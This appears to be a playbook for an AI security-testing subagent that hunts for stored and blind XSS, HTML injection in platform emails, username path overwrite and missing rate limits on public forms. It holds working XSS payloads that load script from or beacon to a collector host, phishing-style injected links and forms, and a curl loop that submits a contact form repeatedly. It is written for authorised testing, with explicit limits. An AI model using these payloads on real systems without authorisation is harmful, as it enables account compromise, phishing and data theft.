# Subagent 06: Stored Input in Identity Fields & Public Forms

## Role & Mission
Responsible for everything an attacker can *store* through registration and unauthenticated forms: usernames/slugs that shadow application routes, XSS and HTML injection in identity fields that render in the app, in admin/support consoles (blind), and in platform-sent emails, and abuse of public contact/support/feedback forms.

## Assigned Checklist Tasks (3 extended checks)
- **Check 38:** Path overwrite via username / profile slug (`login`, `.well-known`, `robots.txt`, `sw.js`, `../admin`)
- **Check 39:** Stored / blind XSS and HTML injection via registration and profile fields
- **Check 40:** Public forms (contact-us, support chat, feedback): missing rate limits and blind XSS

Full procedure, pass/fail criteria and references: [`references/checklist_40.md`](../references/checklist_40.md).

## Safety rules
- Use **your own** blind-XSS collector (Burp Collaborator, self-hosted XSS Hunter). Do not paste third-party collector IDs (xss.report / js.rip links from public notes belong to other people and would send target data to them).
- Payloads must only beacon (`fetch('//COLLAB/?d='+document.domain)`); never read cookies or page content of other users, and never execute actions.
- Public-form flood tests: at most 15 submissions, all clearly marked `bbtest`, any email field set to your own address.
- Remove or rename test accounts that occupy reserved names after testing.

---

## Standardized Execution Playbook

### Step 1: Reserved names & path overwrite (Check 38)
```bash
python3 -I .agents/skills/authbypass/scripts/identity_variants.py --mode reserved | cut -f3 > artifacts/authbypass/reserved_names.txt
# For each name the registration form accepts:
#   1. register (or rename) your test account to it
#   2. request https://<target>/<name>  and  https://<target>/u/<name>
#   3. compare with the response before registration (saved baseline)
```
High-value outcomes: profile served at `/.well-known/<x>` or `/robots.txt` (domain verification / crawler control), at `/login` or `/oauth/callback` (phishing on a trusted path, OAuth redirect gadget for `oauth-sso` OA-03/04), or at `/sw.js` (service-worker hijack).

### Step 2: Stored and blind XSS in identity fields (Check 39)
Inject into every identity field one at a time (username, first/last/display name, company, job title, address, phone, bio, avatar file name, email local part using RFC-valid quoting):

```text
"><img src=x onerror=fetch('//COLLAB/u?'+document.domain)>
'"><script src=//COLLAB/x.js></script>
"<svg/onload=fetch('//COLLAB/e')>"@your-domain.test
```

Render points to check: your own profile, public profile, @mention lists, team/member lists, invite emails, admin user search, support ticket view, CSV/PDF exports (formula injection `=HYPERLINK(...)` hands off to the export skill), and transactional emails.

### Step 3: HTML injection in platform emails (Check 39)
Set display name / company / invite message to:
```html
"/><img src="x"><a href="https://COLLAB">Verify your account</a>
<form action='https://COLLAB/log'><input type=submit value='Continue'></form>
```
Trigger an email to **your own** second account (invite, share, mention, welcome). A finding requires the injected link/form to render as HTML in the received email.

### Step 4: Public forms (Check 40)
```bash
for i in $(seq 1 15); do
  curl -sk -o /dev/null -w "$i %{http_code}\n" -X POST "https://<target>/contact" \
    --data-urlencode "name=bbtest $i" --data-urlencode "email=you+contact@your-domain.test" \
    --data-urlencode "message=bbtest rate-limit probe $i - please ignore"
  sleep 1
done
```
Then submit one blind-XSS payload per field (name, subject, message, uploaded file name, SVG upload in support chat) and wait for collector callbacks (often hours/days).

---

## Output Artifacts
- `artifacts/authbypass/evidence/AB-38_*.txt`, `AB-39_*.txt`, `AB-40_*.txt`
- `artifacts/authbypass/blind_xss_payload_log.tsv` — field, payload ID, timestamp (to correlate delayed callbacks)
